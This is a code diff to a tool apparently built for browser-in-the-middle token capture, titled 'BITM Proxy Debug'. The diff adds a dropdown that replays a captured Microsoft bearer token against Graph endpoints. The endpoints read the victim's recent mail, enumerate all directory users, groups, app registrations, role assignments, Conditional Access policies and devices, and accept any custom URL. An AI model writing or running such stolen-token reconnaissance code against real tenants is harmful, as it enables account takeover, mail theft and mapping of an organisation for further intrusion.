@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.42.0")
+app = FastAPI(title="BITM Proxy Debug", version="1.43.0")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -7921,14 +7921,32 @@ function renderCreds(){
           <button class="btn btn-danger" onclick="event.stopPropagation();send({cmd:'delete_credentials',site_id:'${site.id}'})">Delete</button>
         </div></div>
       <div class="card-body" id="cb-${site.id}" style="display:none">
-        <div style="margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid #333;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
+        <div style="margin-bottom:8px;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
           <span style="color:#94a3b8;font-size:13px;font-weight:600">Test:</span>
           <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testDecode('${site.id}')">Decode JWTs</button>
-          <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testToken('${site.id}')">Test Token (Graph /me)</button>
-          <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testGraphDevices('${site.id}')">Get-MgDevice</button>
-          <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testGraphManagedDevices('${site.id}')">Get-MgDeviceManagementDevice</button>
           <button class="btn" style="padding:3px 10px;font-size:13px;background:#1e3a5f" onclick="testCookies('${site.id}')">Test Cookies</button>
-          <input id="test-url-${site.id}" class="cfg-input" style="flex:1;min-width:180px;font-size:13px" placeholder="Custom test URL (optional)" value="">
+        </div>
+        <div style="margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid #333;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
+          <span style="color:#6ee7b7;font-size:13px;font-weight:600" title="Read-only Microsoft Graph GET calls, run with the captured bearer token. Results depend on the token's scopes; every call lands in Azure AD sign-in logs.">Graph:</span>
+          <select id="graph-fn-${site.id}" class="cfg-input" style="min-width:340px;font-size:13px">
+            <option value="https://graph.microsoft.com/v1.0/me">Who am I — /me</option>
+            <option value="https://graph.microsoft.com/v1.0/me/memberOf">My groups &amp; roles — /me/memberOf</option>
+            <option value="https://graph.microsoft.com/v1.0/me/ownedDevices">My devices — Get-MgDevice (/me/ownedDevices)</option>
+            <option value="https://graph.microsoft.com/v1.0/me/ownedObjects">Apps/groups I own — /me/ownedObjects</option>
+            <option value="https://graph.microsoft.com/v1.0/me/messages?$top=10">Recent mail — /me/messages (Mail.Read)</option>
+            <option value="https://graph.microsoft.com/v1.0/organization">Tenant info — /organization</option>
+            <option value="https://graph.microsoft.com/v1.0/users?$top=999">Directory users — /users</option>
+            <option value="https://graph.microsoft.com/v1.0/groups?$top=999">Groups — /groups</option>
+            <option value="https://graph.microsoft.com/v1.0/servicePrincipals?$top=999">Service principals — /servicePrincipals</option>
+            <option value="https://graph.microsoft.com/v1.0/applications?$top=999">App registrations — /applications</option>
+            <option value="https://graph.microsoft.com/v1.0/directoryRoles">Active directory roles — /directoryRoles</option>
+            <option value="https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments">Role assignments — /roleManagement/directory/roleAssignments</option>
+            <option value="https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies">Conditional Access policies — /identity/conditionalAccess/policies</option>
+            <option value="https://graph.microsoft.com/v1.0/devices?$top=999">All devices — /devices</option>
+            <option value="https://graph.microsoft.com/beta/deviceManagement/managedDevices">Intune managed devices — Get-MgDeviceManagementDevice (beta)</option>
+          </select>
+          <input id="test-url-${site.id}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" placeholder="…or custom URL (overrides)" value="">
+          <button class="btn" style="padding:3px 12px;font-size:13px;background:#065f46" onclick="graphRun('${site.id}')">Run</button>
         </div>
         <div id="test-result-${site.id}" style="margin-top:6px;margin-bottom:8px;display:none"></div>
         ${renderTokenPanel(d,site.id)}
@@ -8306,9 +8324,15 @@ async function testDecode(siteId){
     el.innerHTML=h;
   }catch(e){el.innerHTML=`<div style="color:#f87171">Error: ${esc(e.message)}</div>`}
 }
-async function testToken(siteId){
+// Graph dropdown dispatch — the custom-URL input overrides the selected call.
+function graphRun(siteId){
+  const custom=document.getElementById('test-url-'+siteId)?.value?.trim();
+  const sel=document.getElementById('graph-fn-'+siteId)?.value||'';
+  testToken(siteId, custom||sel);
+}
+async function testToken(siteId, overrideUrl){
   const el=document.getElementById('test-result-'+siteId);
-  const customUrl=document.getElementById('test-url-'+siteId)?.value?.trim();
+  const customUrl=(overrideUrl&&overrideUrl.trim())||document.getElementById('test-url-'+siteId)?.value?.trim();
   el.style.display='';el.innerHTML='<div style="color:#94a3b8">Testing token...</div>';
   try{
     let url='/api/browser/test/token/'+siteId;
@@ -8329,44 +8353,8 @@ async function testToken(siteId){
     <pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:250px;color:#cbd5e1;font-size:13px">${esc(typeof d.response==='string'?d.response:JSON.stringify(d.response,null,2))}</pre>`;
   }catch(e){el.innerHTML=`<div style="color:#f87171">Error: ${esc(e.message)}</div>`}
 }
-async function testGraphDevices(siteId){
-  const el=document.getElementById('test-result-'+siteId);
-  el.style.display='';el.innerHTML='<div style="color:#94a3b8">Querying Get-MgDevice (v1.0/me/ownedDevices)...</div>';
-  try{
-    const r=await apiFetch('/api/browser/test/graph-devices/'+siteId,{method:'POST'});
-    const d=await r.json();
-    if(d.error){
-      el.innerHTML=`<div style="color:#f87171">${esc(d.error)}</div>`;
-      return;
-    }
-    const count=d.device_count||0;
-    el.innerHTML=`<div style="margin-bottom:4px">
-      <span style="color:${d.success?'#4ade80':'#f87171'};font-weight:bold">${d.status_code} ${d.success?'SUCCESS':'FAILED'}</span>
-      <span style="color:#78859b;font-size:13px;margin-left:8px">${count} devices found</span>
-    </div>
-    <div style="font-size:13px;color:#94a3b8;margin-bottom:4px">Endpoint: /v1.0/me/ownedDevices</div>
-    <pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:300px;color:#cbd5e1;font-size:13px">${esc(typeof d.response==='string'?d.response:JSON.stringify(d.response,null,2))}</pre>`;
-  }catch(e){el.innerHTML=`<div style="color:#f87171">Error: ${esc(e.message)}</div>`}
-}
-async function testGraphManagedDevices(siteId){
-  const el=document.getElementById('test-result-'+siteId);
-  el.style.display='';el.innerHTML='<div style="color:#94a3b8">Querying Get-MgDeviceManagementDevice (/beta/deviceManagement/managedDevices)...</div>';
-  try{
-    const r=await apiFetch('/api/browser/test/graph-managed-devices/'+siteId,{method:'POST'});
-    const d=await r.json();
-    if(d.error){
-      el.innerHTML=`<div style="color:#f87171">${esc(d.error)}</div>`;
-      return;
-    }
-    const count=d.device_count||0;
-    el.innerHTML=`<div style="margin-bottom:4px">
-      <span style="color:${d.success?'#4ade80':'#f87171'};font-weight:bold">${d.status_code} ${d.success?'SUCCESS':'FAILED'}</span>
-      <span style="color:#78859b;font-size:13px;margin-left:8px">${count} managed devices found</span>
-    </div>
-    <div style="font-size:13px;color:#94a3b8;margin-bottom:4px">Endpoint: /beta/deviceManagement/managedDevices</div>
-    <pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:300px;color:#cbd5e1;font-size:13px">${esc(typeof d.response==='string'?d.response:JSON.stringify(d.response,null,2))}</pre>`;
-  }catch(e){el.innerHTML=`<div style="color:#f87171">Error: ${esc(e.message)}</div>`}
-}
+// Get-MgDevice / Get-MgDeviceManagementDevice are now options in the Graph
+// dropdown above (routed through testToken's generic Graph-GET path).
 async function testCookies(siteId){
   const el=document.getElementById('test-result-'+siteId);
   const customUrl=document.getElementById('test-url-'+siteId)?.value?.trim();
